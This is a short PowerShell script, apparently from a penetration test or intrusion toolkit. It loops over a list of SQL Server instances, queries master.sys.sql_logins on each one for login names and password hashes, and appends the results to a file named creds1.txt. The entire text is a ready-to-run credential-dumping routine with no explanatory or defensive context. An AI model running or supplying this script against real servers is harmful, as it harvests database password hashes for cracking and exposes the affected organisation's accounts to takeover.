Foreach ($comp in (get-content "C:\users\<user>\desktop\SQL\authInstances.txt")){
   Write-output "Testing $comp"(Invoke-Sqlcmd -query "select name,master.sys.fn_sqlvarbasetostr(password_hash) from master.sys.sql_logins" -serverinstance "$comp") | out-file creds1.txt -append
  }
